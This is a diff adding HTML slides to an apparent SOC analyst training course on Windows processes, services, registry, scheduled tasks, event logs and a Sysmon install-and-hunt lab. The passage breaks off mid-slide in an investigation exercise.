@@ -210,4 +210,2565 @@ code { font-family: 'JetBrains Mono', monospace; color: var(--accent); backgroun
   .controls { gap: 5px; padding: 8px; }
   .btn, .btn-outline { padding: 6px 12px; font-size: 11px; }
   .page-input { width: 40px; font-size: 12px; }
-  #ind
+  #indicator { padding: 5px; font-size: 11px; }
+}
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="progressBar"></div>
+
+<div class="controls">
+  <button class="btn" onclick="prevSlide()"><i class="fa-solid fa-arrow-left"></i> Prev</button>
+  <span id="indicator">1 / 134</span>
+  <span class="module-label" id="moduleLabel"></span>
+  <input type="number" id="pageInput" class="page-input" min="1" max="134" onkeypress="if(event.key==='Enter')goToPage()">
+  <button class="btn" onclick="goToPage()" style="padding:10px 15px;">Go</button>
+  <button class="btn" onclick="nextSlide()">Next <i class="fa-solid fa-arrow-right"></i></button>
+</div>
+
+<!-- ================================================================================== -->
+<!-- SLIDE 0: DASHBOARD                                                                  -->
+<!-- ================================================================================== -->
+<div class="slide active">
+  <div style="max-width:900px;margin:0 auto;width:100%;">
+    <div style="text-align:center;margin-bottom:32px;">
+      <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:8px;font-size:14px;">SOC ACADEMY</div>
+      <h1 style="font-size:48px;">Security Operations Center<br>Practical Masterclass</h1>
+      <p style="margin-top:16px;font-size:18px;">15 Modules — from OS fundamentals to incident response.</p>
+      <p style="font-size:14px;color:var(--muted);">Click any module to start. Use arrow keys or the controls below to navigate.</p>
+    </div>
+
+    <div id="dashGrid"></div>
+  </div>
+</div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 01: FUNDAMENTALS — 28 slides (1-28)                                          -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 1: M01 INTRO -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 01</div>
+    <h1>Computer &amp; Network<br>Fundamentals</h1>
+    <h2 style="margin-top:24px;color:var(--text);">Practical SOC Masterclass</h2>
+    <p style="margin-top:32px;">10 Interactive Slides covering Windows OS fundamentals.</p>
+    <p style="margin-top:12px;font-size:16px;color:var(--muted);">Understand what is <em>normal</em> before learning what is malicious.</p>
+    <div style="margin-top:40px;">
+      <i class="fa-brands fa-windows fa-3x" style="margin:0 16px;color:var(--accent);"></i>
+      <i class="fa-brands fa-linux fa-3x" style="margin:0 16px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-network-wired fa-3x" style="margin:0 16px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:16px;">Press <strong>Next</strong> to start</p>
+    <p style="font-size:13px;color:var(--muted);margin-top:8px;">Part 1: Windows OS</p>
+  </div>
+</div>
+
+<!-- SLIDE 2: PART HEADER — WINDOWS -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="grid-2">
+    <div>
+      <span class="badge badge-part">PART 1</span>
+      <h1 style="color:var(--accent);-webkit-text-fill-color:var(--accent);">Windows OS</h1>
+      <p>Processes, Services, Registry, Logs &amp; Permissions</p>
+      <p><em>Slides 3 — 10</em></p>
+    </div>
+    <div style="font-size:180px;text-align:center;color:var(--accent);">
+      <i class="fa-brands fa-windows"></i>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 3: PROCESS VS THREAD -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Process vs Thread</h2><span class="slide-num">FUNDAMENTALS</span></div>
+  <div class="grid-2">
+    <div class="card" style="border-left:4px solid var(--accent);">
+      <h3>Process</h3>
+      <p>A program in execution. Has its own <strong>PID</strong>, memory space, handles, and security context.</p>
+      <p>Examples: <code>notepad.exe</code>, <code>chrome.exe</code>, <code>sshd</code></p>
+      <p style="margin-top:8px;font-size:15px;">Every process has at least <strong>one thread</strong>.</p>
+    </div>
+    <div class="card" style="border-left:4px solid var(--green);">
+      <h3>Thread</h3>
+      <p>The smallest unit of execution within a process. Multiple threads share the same memory space.</p>
+      <p>All threads in a process share the same memory and resources.</p>
+      <p style="margin-top:8px;font-size:15px;">Attackers inject threads into <em>other</em> processes (process injection).</p>
+    </div>
+  </div>
+  <div style="margin-top:16px;padding:12px;background:var(--slide-bg);border-radius:8px;border:1px solid var(--border);font-size:15px;color:var(--muted);">
+    <strong style="color:var(--yellow);">SOC Insight:</strong> Always check parent-child relationships. <code>winword.exe → powershell.exe</code> is suspicious.
+  </div>
+</div>
+
+<!-- SLIDE 4: WINDOWS PROCESS TREE -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Windows Process Tree</h2><span class="slide-num">ARCHITECTURE</span></div>
+  <p>The Windows boot sequence creates a hierarchy of critical system processes. Know what's normal.</p>
+  <div style="display:flex;flex-direction:column;align-items:center;gap:4px;margin:20px 0;font-size:18px;">
+    <div class="card" style="border-color:var(--red);padding:14px;">System (PID 4) — Kernel</div>
+    <div><i class="fa-solid fa-arrow-down" style="color:var(--muted);font-size:16px;"></i></div>
+    <div class="card" style="border-color:var(--yellow);padding:14px;">smss.exe — Session Manager</div>
+    <div><i class="fa-solid fa-arrow-down" style="color:var(--muted);font-size:16px;"></i></div>
+    <div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center;">
+      <div class="card" style="padding:12px;font-size:16px;">csrss.exe<br><small>Win32 subsystem</small></div>
+      <div class="card" style="padding:12px;font-size:16px;">wininit.exe<br><small>Startup</small></div>
+    </div>
+    <div><i class="fa-solid fa-arrow-down" style="color:var(--muted);font-size:16px;"></i></div>
+    <div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center;">
+      <div class="card" style="padding:12px;font-size:16px;border-color:var(--accent);">services.exe<br><small>Service Control</small></div>
+      <div class="card" style="padding:12px;font-size:16px;border-color:var(--accent);">lsass.exe<br><small>Authentication</small></div>
+      <div class="card" style="padding:12px;font-size:16px;border-color:var(--accent);">svchost.exe<br><small>Service Host</small></div>
+    </div>
+  </div>
+  <p style="color:var(--muted);font-size:15px;"><strong style="color:var(--yellow);">Rule:</strong> Never trust a process you can't identify. Research unknown processes before assuming they're benign.</p>
+</div>
+
+<!-- SLIDE 5: TASKLIST -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Viewing Processes: tasklist</h2><span class="slide-num">COMMANDS</span></div>
+  <div class="grid-2">
+    <div>
+      <p><code>tasklist</code> shows every running process on Windows.</p>
+      <p>Columns: Image Name, PID, Session Name, Memory Usage.</p>
+      <p style="margin-top:8px;">Variations:</p>
+      <p><code>tasklist /svc</code> — shows services per process</p>
+      <p><code>tasklist /v</code> — verbose (user, status)</p>
+    </div>
+    <div class="terminal">
+      <span class="comment"># List all running processes</span><br>
+      <span class="prompt">C:\&gt;</span> <span class="cmd">tasklist</span><br><br>
+      <span style="color:#64748b;">
+System Idle Process      0 Services     8 K<br>
+System                   4 Services  8192 K<br>
+smss.exe               340 Services  1456 K<br>
+csrss.exe              452 Services  6832 K<br>
+wininit.exe            580 Services  5264 K<br>
+services.exe           644 Services 10572 K<br>
+lsass.exe              660 Services 18496 K<br>
+svchost.exe            788 Services 13380 K<br>
+explorer.exe          1232 Console 112456 K<br>
+chrome.exe            4520 Console 289456 K
+      </span>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 6: WINDOWS SERVICES -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Windows Services</h2><span class="slide-num">SERVICES</span></div>
+  <p>Background processes that run <strong>without a user interface</strong>. Managed by Service Control Manager (<code>services.exe</code>).</p>
+  <div class="grid-2" style="margin-top:16px;">
+    <div class="card">
+      <p>Hosted inside <strong>svchost.exe</strong> instances (multiple services per host).</p>
+      <p>Run as <strong>SYSTEM</strong>, <strong>LOCAL SERVICE</strong>, or <strong>NETWORK SERVICE</strong>.</p>
+      <p style="color:var(--yellow);font-size:16px;margin-top:8px;">Attackers create malicious services for persistence.</p>
+    </div>
+    <div class="terminal">
+      <span class="comment"># Query all services</span><br>
+      <span class="prompt">C:\&gt;</span> <span class="cmd">sc query</span><br><br>
+      <span style="color:#64748b;">
+SERVICE_NAME: BITS<br>
+STATE       : 4  RUNNING<br><br>
+SERVICE_NAME: EventLog<br>
+STATE       : 4  RUNNING<br><br>
+SERVICE_NAME: WSearch<br>
+STATE       : 1  STOPPED
+      </span>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--red);">Suspicious: a service from <code>Temp</code> or <code>AppData</code>, or svchost from a non-standard path. Always check <code>sc qc &lt;service&gt;</code> for the binary path.</p>
+</div>
+
+<!-- SLIDE 7: REGISTRY -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Windows Registry</h2><span class="slide-num">REGISTRY</span></div>
+  <p>Hierarchical database of Windows and application configuration. Attackers use it for <strong>persistence</strong> and <strong>defense evasion</strong>.</p>
+  <div class="grid-2" style="margin-top:16px;">
+    <div>
+      <div class="card" style="margin-bottom:8px;"><code>HKLM\...\CurrentVersion\Run</code> — Machine-wide autoruns</div>
+      <div class="card" style="margin-bottom:8px;"><code>HKCU\...\CurrentVersion\Run</code> — Per-user autoruns</div>
+      <div class="card"><code>HKLM\...\CurrentVersion\RunOnce</code> — One-time execution</div>
+    </div>
+    <div class="terminal">
+      <span class="comment"># Check startup programs</span><br>
+      <span class="prompt">C:\&gt;</span> <span class="cmd">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><br>
+      <span style="color:#64748b;">
+SecurityHealth    C:\Windows\...\SecurityHealthSystray.exe<br>
+VMwareTray        C:\Program Files\VMware\VMwareTray.exe
+      </span>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">Always check Run keys during investigations. Look for entries in <code>Temp</code>, <code>AppData</code>, or random folder names.</p>
+</div>
+
+<!-- SLIDE 8: SCHEDULED TASKS -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Scheduled Tasks</h2><span class="slide-num">PERSISTENCE</span></div>
+  <div class="grid-2">
+    <div class="card">
+      <p>Run programs at specific times or triggered by events (logon, idle, startup).</p>
+      <p>One of the top 5 attacker persistence mechanisms.</p>
+      <p>Can run as <strong>SYSTEM</strong> — highest privilege.</p>
+      <p>Can be hidden from the Task Scheduler UI.</p>
+    </div>
+    <div class="terminal">
+      <span class="comment"># List all scheduled tasks</span><br>
+      <span class="prompt">C:\&gt;</span> <span class="cmd">schtasks /query /fo LIST /v</span><br><br>
+      <span style="color:#64748b;">
+TaskName:    \Microsoft\Windows\...\ConfigNotification<br>
+Run As User: SYSTEM<br>
+Task To Run: C:\Windows\System32\migwiz\posttask.dll
+      </span>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">Check for tasks with actions pointing to <code>Temp</code>, <code>AppData</code>, or using encoded PowerShell.</p>
+</div>
+
+<!-- SLIDE 9: EVENT LOGS -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>Event Viewer &amp; Logs</h2><span class="slide-num">LOGS</span></div>
+  <p style="margin-bottom:12px;">Every significant action on Windows is logged. The SOC analyst's primary data source.</p>
+  <table class="tbl">
+    <tr><th>Log</th><th>Contents</th><th>Key Event IDs</th></tr>
+    <tr><td><strong>Security</strong></td><td>Logon/logoff, privilege use</td><td>4624 (logon), 4625 (failed)</td></tr>
+    <tr><td><strong>System</strong></td><td>Service start/stop, driver loads</td><td>7045 (service install)</td></tr>
+    <tr><td><strong>Sysmon</strong></td><td>Process, network, file, registry</td><td>1 (proc), 3 (net), 11 (file)</td></tr>
+    <tr><td><strong>PowerShell</strong></td><td>Script block logging</td><td>4104 (script execution)</td></tr>
+  </table>
+  <div class="terminal" style="margin-top:16px;">
+    <span class="comment"># Query recent Security events</span><br>
+    <span class="prompt">C:\&gt;</span> <span class="cmd">wevtutil qe Security /c:5 /rd:true /f:text</span><br><br>
+    <span style="color:#64748b;">
+Event[0]: 4625 (Failed Logon) — User: admin, Source IP: 10.0.0.99<br>
+Event[1]: 4624 (Successful Logon) — User: jdoe, Logon Type: 2<br>
+Event[2]: 4688 (Process Creation) — PID: 7844, Cmd: powershell.exe
+    </span>
+  </div>
+</div>
+
+<!-- SLIDE 10: USER ACCOUNTS -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div class="slide-header"><h2>User Accounts &amp; Permissions</h2><span class="slide-num">SECURITY</span></div>
+  <div class="grid-3">
+    <div class="card" style="border-left:4px solid var(--red);">
+      <h3>SYSTEM</h3>
+      <p>Highest privilege. Kernel-level access. LSASS runs as SYSTEM.</p>
+    </div>
+    <div class="card" style="border-left:4px solid var(--yellow);">
+      <h3>Administrator</h3>
+      <p>Full admin rights. UAC blocks some actions (but bypasses exist).</p>
+    </div>
+    <div class="card" style="border-left:4px solid var(--green);">
+      <h3>Standard User</h3>
+      <p>Limited. Cannot modify system files or install drivers.</p>
+    </div>
+  </div>
+  <div class="terminal" style="margin-top:12px;">
+    <span class="comment"># Who am I?</span><br>
+    <span class="prompt">C:\&gt;</span> <span class="cmd">whoami</span><br>
+    <span style="color:#64748b;">desktop-7f3a\analyst</span><br><br>
+    <span class="prompt">C:\&gt;</span> <span class="cmd">whoami /priv</span><br>
+    <span style="color:#64748b;">SeShutdownPrivilege           Shut down the system      Disabled<br>SeChangeNotifyPrivilege       Bypass traverse checking  Enabled</span><br><br>
+    <span class="prompt">C:\&gt;</span> <span class="cmd">net user</span><br>
+    <span style="color:#64748b;">Administrator   analyst   Guest</span>
+  </div>
+</div>
+
+<!-- SLIDE 11: SUMMARY -->
+<div class="slide" data-module="Module 01: Fundamentals">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 01 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You should now be able to:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">List running processes on Windows &amp; Linux</div>
+      <div class="card">Identify critical system processes (lsass, svchost, systemd)</div>
+      <div class="card">Query the Registry, Task Scheduler &amp; Event Logs</div>
+      <div class="card">Inspect network connections and resolve DNS</div>
+      <div class="card">Recognize common protocol ports (22, 80, 443, 445, 3389)</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Before Module 02 (Logs):</p>
+      <p style="font-size:14px;color:var(--muted);">Run every command shown in this module on your own machines. Build your baseline of what "normal" looks like.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+</div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 02: LOGS — 18 slides (12-29)                                                 -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 12: M02 INTRO -->
+<div class="slide" data-module="Module 02: Logs">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 02</div>
+    <h1>Logs: The Language<br>of Security</h1>
+    <h2 style="margin-top:24px;color:var(--text);">Windows · Linux · Web · Firewall</h2>
+    <p style="margin-top:32px;">18 Interactive Slides — every SOC analyst must speak logs fluently.</p>
+    <p style="margin-top:12px;font-size:16px;color:var(--muted);">If you can't read the logs, you can't find the breach.</p>
+    <div style="margin-top:40px;">
+      <i class="fa-solid fa-scroll fa-3x" style="margin:0 16px;color:var(--accent);"></i>
+      <i class="fa-solid fa-magnifying-glass fa-3x" style="margin:0 16px;color:var(--accent2);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:16px;">Press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 13: PART HEADER — WINDOWS LOGS -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="grid-2">
+    <div>
+      <span class="badge badge-part">PART 1</span>
+      <h1 style="color:var(--accent);-webkit-text-fill-color:var(--accent);">Windows Event Logs</h1>
+      <p>Security, System, Sysmon &amp; PowerShell</p>
+      <p><em>Slides 14 — 19</em></p>
+    </div>
+    <div style="font-size:180px;text-align:center;color:var(--accent);">
+      <i class="fa-solid fa-scroll"></i>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 14: SECURITY LOG DEEP DIVE -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Security Log Deep Dive</h2><span class="slide-num">EVENT IDS</span></div>
+  <p>The Security log records every authentication attempt. This is your first stop in any investigation.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>Event ID</th><th>What It Means</th><th>Investigation Use</th></tr>
+    <tr><td><strong>4624</strong></td><td>Successful logon</td><td>Who logged in? From where? When?</td></tr>
+    <tr><td><strong>4625</strong></td><td>Failed logon</td><td>Brute force indicator — many of these = attack</td></tr>
+    <tr><td><strong>4634</strong></td><td>Logoff</td><td>Session duration — was it abnormally short?</td></tr>
+    <tr><td><strong>4648</strong></td><td>Explicit credential usage</td><td>RunAs — potential lateral movement</td></tr>
+    <tr><td><strong>4672</strong></td><td>Admin logon (special privileges)</td><td>Who got admin access? Should they have it?</td></tr>
+  </table>
+  <div class="terminal" style="margin-top:12px;">
+    <span class="comment"># Logon types you must know:</span><br>
+    <span style="color:#64748b;">
+Type 2 — Interactive (user at keyboard)<br>
+Type 3 — Network (file share, remote access)<br>
+Type 5 — Service (service startup)<br>
+Type 7 — Unlock (screen saver unlock)<br>
+Type 10 — RemoteInteractive (RDP)
+    </span>
+  </div>
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">Pro tip: <strong>Type 3 + Type 10</strong> from an external IP = RDP brute force. Always check.</p>
+</div>
+
+<!-- SLIDE 15: 🔍 INVESTIGATION — BRUTE FORCE -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>🔍 Investigation: Brute Force</h2><span class="slide-num">HANDS ON</span></div>
+  <p>You're on your first SOC shift. A user reports their account is locked. You pull the Security log:</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Recent failed logon events (4625)</span><br>
+    <span style="color:#64748b;">
+08:01:23  4625  An account failed to log on.<br>
+  Account Name:     administrator<br>
+  Source Network:   203.0.113.45<br>
+  Logon Type:       10<br><br>
+08:01:25  4625  An account failed to log on.<br>
+  Account Name:     administrator<br>
+  Source Network:   203.0.113.45<br><br>
+08:01:27  4625  An account failed to log on.<br>
+  Account Name:     jdoe<br>
+  Source Network:   203.0.113.45<br><br>
+08:02:01  4624  An account was successfully logged on.<br>
+  Account Name:     jdoe<br>
+  Source Network:   203.0.113.45<br>
+  Logon Type:       10
+    </span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">What happened? Analyze and click each question to check:</p>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. What type of attack is this?
+    <div class="quiz-answer"><strong>RDP brute force</strong> — Logon Type 10 (RDP) from external IP 203.0.113.45, rapid attempts against multiple usernames.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. Did the attacker get in?
+    <div class="quiz-answer"><strong>Yes</strong> — Event 4624 at 08:02:01 shows successful logon for user jdoe. The account is compromised.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. What's your first containment step?
+    <div class="quiz-answer"><strong>Disable the jdoe account</strong> and block 203.0.113.45 at the firewall. Then investigate what the attacker accessed via RDP.</div>
+  </div>
+</div>
+
+<!-- SLIDE 16: SYSMON PRACTICAL LAB -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Sysmon Lab: Install &amp; Investigate</h2><span class="slide-num">PRACTICAL</span></div>
+  <p>Time for a real hands-on lab. You need a <strong>Windows machine</strong> (VM or local). Follow each step and verify in Sysmon.</p>
+
+  <p style="margin-top:12px;font-weight:600;color:var(--accent);">Step 1: Download Sysmon</p>
+  <div class="terminal">
+    <span class="comment"># Download Sysmon from Microsoft Sysinternals</span><br>
+    <span class="prompt">PS&gt;</span> wget https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip<br>
+    <span class="prompt">PS&gt;</span> Expand-Archive .\Sysmon.zip -DestinationPath .\Sysmon
+  </div>
+
+  <p style="margin-top:10px;font-weight:600;color:var(--accent);">Step 2: Get a config &amp; install</p>
+  <div class="terminal">
+    <span class="comment"># Download the SwiftOnSecurity config (gold standard)</span><br>
+    <span class="prompt">PS&gt;</span> wget https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile sysmonconfig.xml<br><br>
+    <span class="comment"># Install Sysmon with the config (Run as Administrator)</span><br>
+    <span class="prompt">PS&gt;</span> .\Sysmon\Sysmon64.exe -accepteula -i sysmonconfig.xml
+  </div>
+
+  <p style="margin-top:10px;font-weight:600;color:var(--accent);">Step 3: Verify installation</p>
+  <div class="terminal">
+    <span class="comment"># Check Sysmon is running</span><br>
+    <span class="prompt">PS&gt;</span> Get-Service Sysmon<br><br>
+    <span class="comment"># Open Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational</span><br>
+    <span class="prompt">PS&gt;</span> eventvwr.msc
+  </div>
+
+  <p style="margin-top:10px;font-weight:600;color:var(--accent);">Step 4: Generate some events</p>
+  <div class="terminal">
+    <span class="comment"># Open notepad and type something</span><br>
+    <span class="prompt">PS&gt;</span> notepad<br><br>
+    <span class="comment"># Run commands an attacker would use</span><br>
+    <span class="prompt">PS&gt;</span> whoami<br>
+    <span class="prompt">PS&gt;</span> ipconfig /all<br>
+    <span class="prompt">PS&gt;</span> net user administrator<br>
+    <span class="prompt">PS&gt;</span> netstat -anob<br><br>
+    <span class="comment"># Download something (simulate a payload download)</span><br>
+    <span class="prompt">PS&gt;</span> wget https://example.com -OutFile test.html
+  </div>
+
+  <p style="margin-top:10px;font-weight:600;color:var(--accent);">Step 5: Hunt in Sysmon</p>
+  <p>Go back to Event Viewer → Sysmon Operational. Filter by Event ID and find each action you just did.</p>
+</div>
+
+<!-- SLIDE 16b: WHAT YOU SHOULD SEE -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>What You Should See in Sysmon</h2><span class="slide-num">PRACTICAL</span></div>
+  <p>After the lab, cross-check your Sysmon events against this table. If you see them, everything works.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>Your Action</th><th>Sysmon Event ID</th><th>What to Look For</th></tr>
+    <tr><td><code>notepad</code></td><td><strong>1</strong></td><td>Image: notepad.exe, ParentImage: powershell.exe or cmd.exe</td></tr>
+    <tr><td><code>whoami</code></td><td><strong>1</strong></td><td>Image: whoami.exe, CommandLine includes your username</td></tr>
+    <tr><td><code>ipconfig /all</code></td><td><strong>1</strong></td><td>Image: ipconfig.exe, CommandLine: ipconfig /all</td></tr>
+    <tr><td><code>wget example.com</code></td><td><strong>3</strong> + <strong>22</strong></td><td>Event 3: powershell.exe → 93.184.216.34:443<br>Event 22: DNS query for example.com</td></tr>
+    <tr><td><code>net user</code></td><td><strong>1</strong></td><td>Image: net.exe, CommandLine: net user administrator</td></tr>
+    <tr><td><code>netstat -anob</code></td><td><strong>1</strong></td><td>Image: netstat.exe, reveals active connections</td></tr>
+  </table>
+
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Quick PowerShell query — search Sysmon for any process named "whoami"</span><br>
+    <span class="prompt">PS&gt;</span> Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object { $_.Properties[5].Value -like '*whoami*' }<br><br>
+    <span class="comment"># Sample output (truncated)</span><br>
+    <span style="color:#64748b;">
+TimeCreated: 7/6/2026 10:15:30<br>
+ProcessId: 4520<br>
+Image: C:\Windows\System32\whoami.exe<br>
+CommandLine: whoami<br>
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    </span>
+  </div>
+
+  <p style="margin-top:8px;font-size:15px;color:var(--yellow);">Challenge: Run a suspicious command like <code>powershell -EncodedCommand ...</code> and see if Sysmon captures the full encoded string in Event ID 1. It does.</p>
+</div>
+
+
+
+<!-- SLIDE 19: SYSMON ADVANTAGES & DISADVANTAGES -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Sysmon: Pros &amp; Cons</h2><span class="slide-num">FUNDAMENTALS</span></div>
+
+  <div style="display:flex;flex-direction:column;gap:10px;margin-top:12px;">
+    <p style="font-size:17px;font-weight:600;color:var(--green);"><i class="fa-solid fa-check"></i> Advantages</p>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <strong>Free and supported by Microsoft</strong> — no license cost, production-ready, included with Sysinternals.
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <strong>Minimal performance impact</strong> — runs as a kernel driver, typical CPU usage is &lt;1%. Can be deployed on thousands of endpoints.
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <strong>Granular visibility</strong> — command lines, network connections per process, DNS queries, file hashes, registry changes. All in one log source.
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <strong>Configurable filtering</strong> — XML config to include/exclude events. Reduce noise by filtering known-good behavior (e.g., Windows Update, antivirus scans).
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <strong>Integrates everywhere</strong> — events go to the standard Windows Event Log, consumed by any SIEM (Splunk, Elastic Sentinel, Wazuh, etc.).
+    </div>
+  </div>
+
+  <div style="display:flex;flex-direction:column;gap:10px;margin-top:12px;">
+    <p style="font-size:17px;font-weight:600;color:var(--red);"><i class="fa-solid fa-xmark"></i> Disadvantages</p>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <strong>Driver conflicts</strong> — SysmonDrv.sys can conflict with some antivirus/firewall drivers. Requires testing before deployment.
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <strong>Log volume explosion without a good config</strong> — default config logs everything. Expect 5-10 GB/day per host with the default config. A curated config is essential.
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <strong>No alerting on its own</strong> — Sysmon only generates logs. It does not alert, correlate, or notify. You need a SIEM or EDR to analyze the data.
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <strong>Can be unloaded by kernel-mode malware</strong> — a sufficiently privileged attacker can stop or tamper with the Sysmon driver. It's not a security boundary.
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <strong>No detections — only telemetry</strong> — Sysmon provides data; your analysts and rules provide detection. It's only as good as your ability to query and analyze.
+    </div>
+  </div>
+
+  <p style="margin-top:10px;font-size:14px;color:var(--yellow);">Verdict: <strong>Deploy Sysmon everywhere</strong>, but pair it with a good config (SwiftOnSecurity) and a SIEM to consume the logs.</p>
+</div>
+
+<!-- SLIDE 22: SYSMON CONFIG DEEP DIVE -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>Sysmon Config: How It Works</h2><span class="slide-num">DEEP DIVE</span></div>
+  <p>Sysmon uses an XML config file that tells it <strong>what to log</strong> and <strong>what to ignore</strong>. Understanding the config = understanding what you're (not) seeing.</p>
+
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment">&lt;!-- SwiftOnSecurity config — sample rule --&gt;</span><br>
+    <span style="color:#64748b;">
+&lt;Sysmon schemaversion="4.90"&gt;<br>
+  &lt;EventFiltering&gt;<br>
+<br>
+    &lt;!-- Log all process creation EXCEPT known-good --&gt;<br>
+    &lt;ProcessCreate onmatch="<span class="hl">exclude</span>"&gt;<br>
+      &lt;CommandLine condition="is"&gt;C:\Windows\system32\svchost.exe -k -p&lt;/CommandLine&gt;<br>
+      &lt;Image condition="end with"&gt;\Windows\System32\taskhostw.exe&lt;/Image&gt;<br>
+    &lt;/ProcessCreate&gt;<br>
+<br>
+    &lt;!-- Log all network connections EXCEPT known-good --&gt;<br>
+    &lt;NetworkConnect onmatch="<span class="hl">exclude</span>"&gt;<br>
+      &lt;Image condition="begin with"&gt;C:\Windows\System32\svchost.exe&lt;/Image&gt;<br>
+      &lt;DestinationIp condition="is"&gt;127.0.0.1&lt;/DestinationIp&gt;<br>
+    &lt;/NetworkConnect&gt;<br>
+<br>
+    &lt;!-- Log all DNS queries EXCEPT known-good --&gt;<br>
+    &lt;DnsQuery onmatch="<span class="hl">exclude</span>"&gt;<br>
+      &lt;Image condition="begin with"&gt;C:\Windows\System32\sppsvc.exe&lt;/Image&gt;<br>
+    &lt;/DnsQuery&gt;<br>
+  &lt;/EventFiltering&gt;<br>
+&lt;/Sysmon&gt;
+    </span>
+  </div>
+
+  <p style="margin-top:8px;font-weight:600;">`onmatch="exclude"` means: log everything <strong>except</strong> these. This is the default. You add exclusions to reduce noise.</p>
+  <div class="card" style="font-size:14px;">
+    <strong>Common conditions:</strong> <code>is</code> (exact match), <code>begin with</code>, <code>end with</code>, <code>contains</code>, <code>is any</code> (list).
+    Build exclusions carefully — too broad = you miss attacks.
+  </div>
+</div>
+
+<!-- SLIDE 17 (renumbered 20): 🔍 INVESTIGATION — TRACE THE PROCESS TREE -->
+<div class="slide" data-module="Module 02: Logs">
+  <div class="slide-header"><h2>🔍 Investigation: Trace the Attack</h2><span class="slide-num">HANDS ON</span></div>
+  <p>An alert fires: "Suspicious PowerShell from Office." You pull Sysmon Event ID 1 (process creation).</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Sysmon Event ID 1 entries in sequence</span><br>
+    <span style="color:#64748b;">
